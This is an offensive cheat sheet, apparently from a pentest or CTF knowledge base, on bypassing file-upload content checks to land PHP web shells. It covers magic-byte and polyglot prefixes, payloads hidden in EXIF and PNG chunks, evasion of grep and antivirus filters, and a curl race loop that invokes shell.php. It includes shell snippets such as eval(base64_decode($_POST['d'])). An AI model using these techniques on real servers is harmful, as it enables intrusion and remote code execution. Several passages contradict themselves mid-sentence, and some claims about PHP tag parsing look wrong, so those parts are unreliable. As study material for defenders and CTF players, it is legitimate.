# Content Bypass — when the server inspects the bytes

## The content-check taxonomy — identify which is running

| Check | Typical tool | Detected by |
|---|---|---|
| magic-byte prefix | `finfo`, `file`, `imghdr` | bare `GIF89a`+payload passes |
| structural parse | `getimagesize`, PIL `.verify()`, `sharp` | bare prefix fails; real file + appended payload passes |
| full re-encode | GD, Imagick `-resize`, sharp `.toBuffer()` | appended payload stripped — file differs on fetch-back |
| content grep/AV | ClamAV, regex denylist (`<?php`) | specific byte sequences rejected by name |
| size/dimension limits | width/height/size caps | specific reject messages |

**First measurement — the re-encode test**: upload a real image with a
unique trailing string, fetch it back, `cmp`. Byte-identical → no
re-encode; any difference → a processor ran, and the payload must live in
pixels (`image-attacks.md`).

## Level 1 — magic-byte prefix only

`finfo`/`file`/weak sniffers read the first bytes:

```
GIF89a;\n<payload>            # classic — see mime-bypass.md
\x89PNG\r\n\x1a\n<payload>    # PNG signature line
\xff\xd8\xff\xe0<payload>     # JPEG SOI+APP0 start
%PDF-1.4\n<payload>           # PDF sig
PK\x03\x04...                  # real zip required — readers scan from tail
```

Payload stays valid PHP/Python etc. because interpreters skip output before
`<?php`/evaluate the script portion.

## Level 2 — structural parse (getimagesize/PIL/sharp)

The file must BE a real image; payload goes where parsers don't look:

- **Trailing append**: `cat real.png payload > x.png` — PNG parsers stop
  at `IEND`; bytes after are ignored. `payload` executes if the file is
  ever interpreted as PHP.
- **JPEG COM segment**: `FF D8` + `FF FE len16 payload` — invisible comment.
- **PNG `tEXt`/`iTXt` chunk**: `pngcheck`-clean, parsers ignore.
- **EXIF fields**: `exiftool -Comment=` / `-UserComment=` / `-ImageDescription=`.
- **IDAT-split pixel payloads**: only for re-encode survival — next level.

## Level 3 — re-encode survival (GD / Imagick / sharp)

Full re-encode strips every byte you control except **pixel values**.
Payload must survive decompression → resample → recompression:

- **PNG**: GD `imagecreatefrompng`+`imagepng` is *lossless* for pixels and
  *does not resample* when no resize is applied — payload in IDAT pixel
  data can survive verbatim if zlib streams align. The known technique:
  craft the image so the compressed IDAT stream contains the payload
  (PHP-GD keeps exact scanlines; the payload survives when placed so that
  decompressed bytes = your string). Search "gd php payload idat" shape —
  this is fiddly; CTF usually expects it only when source proves GD.
- **JPEG**: quality-resample destroys exact bytes. The known-surviving
  technique embeds the payload in DCT coefficient relationships — only
  practical with the published generator script; treat as last resort.
- **Resize vs no-resize**: if the pipeline only *converts* (png→png same
  dims), payload-in-IDAT is the real vector; if it *resizes*, pixels
  interpolate — even harder.
- **Metadata-preserving pipelines**: some re-encoders keep EXIF (`-strip`
  absent) → EXIF payload survives. Check by uploading EXIF-marked image and
  reading metadata back with `exiftool`.

Honest read: when re-encode strips everything, the upload→RCE path is
usually dead *by this route* — pivot to LFI/phar/include of the stored
file, or to parser attacks (the re-encoder itself: ImageTragick,
Ghostscript → `image-attacks.md`).

## Level 4 — content grep / AV denylist

Signatures the grep looks for: `<?php`, `eval(`, `system(`, `<?=`, `<%`,
`Runtime.getRuntime`, `subprocess`, known shell strings.

Bypasses:

- **alternate tags**: `<script language="php">` (PHP<7 removed; still on
  some stacks), `<%` ASP in .php files? no — PHP only honors `<?`; ASP
  engines honor `<%` AND `%>` inside .asp
- **split the marker**: `<?ph` + `p` via string concat? PHP can't split its
  own tag; instead use `.phtml`/`.inc` if the grep is extension-scoped
- **whitespace/comments**: `<? php`, `<?/**/php` — PHP accepts
- **eval-free shells**: `<?=`echo`` or function-variable call
  `$_GET['f']($_GET['x'])` avoids banned function names
- **base64 inside**: `<?php eval(base64_decode($_POST['d']))` — grep on
  `system(` passes unless `eval` is also denied
- **packed/obfuscated**: `gzinflate`, `str_rot13`, chr() concatenation
- **PHP open-tag in a comment**: AV anchored on `<?php` literal —
  `<?\nphp` broken by line (PHP parses `<?php` needing contiguous; use
  `<?=` or `<? ... ?>` short-open when enabled)

## Chunked-size games — Content-Length and partial reads

Some validators read only the first N bytes:

- `[valid image bytes][padding to N][payload]` — check reads the head,
  store keeps the whole file
- huge first-chunk headers pushing the payload past the sniff window

## Content-check bypass by format confusion

A file that is two valid things at once — `polyglot-files.md`:

- `GIF89a` header + `<?php` body — sniffer sees image, PHP sees script
- valid ZIP with appended PHP — zip readers seek the End-of-Central-
  Directory at the tail; PHP reads top-down. Prepending `<?php` text to a
  zip keeps it a valid zip AND a php script (PHP executes the prefix text
  as output, then hits `<?php`? no — for zip+php, put the PHP block FIRST
  as a zip comment/local header, or append the zip after `<?php ... ?>`)
- `%PDF` + `<?php` — PDF readers tolerate trailing bytes; put payload in a
  PDF comment/stream
- JPEG+PHP via COM marker — above

## Filename-content interplay — Content-Disposition vs body

A validator may scan the **filename** for `<?php`/`../` while ignoring the
body, or scan the body while the filename carries the traversal. Split the
attack across both fields — the filename is also an injection surface
(`path-traversal.md`, `parser-differentials.md`).

## Race the validator — TOCTOU windows

If the flow is `store → validate → delete-on-fail`, the file exists between
steps 1 and 3:

```
loop: curl /uploads/shell.php?c=id &      # fetch attempt
loop: curl -F f=@shell.php /upload        # upload attempt
```

Same for `store-temp → validate → rename`: guess the temp name pattern
(`tmp_<ts>`, `phpXXXXXX`, uuid) and fetch during the window →
`race-and-temp-files.md`.

## Multiple-endpoint disparity

The app often has several upload paths with different validators —
`/avatar` strict, `/import` none, `/api/v2/upload` new, legacy `/upload.php`
forgotten. Enumerate ALL of them (`detection.md` inventory); attack the
weakest.

## Falsifiers

- every uploaded byte is re-encoded with no controllable survivors AND no
  include/parser angle exists
- the content grep is comprehensive for the target language AND the
  extension + mapping angles are closed

## Output to record

- the content-check level proven (prefix/structural/re-encode/grep)
- the re-encode diff result (bytes identical? which bytes changed?)
- the specific bypass that landed the payload intact
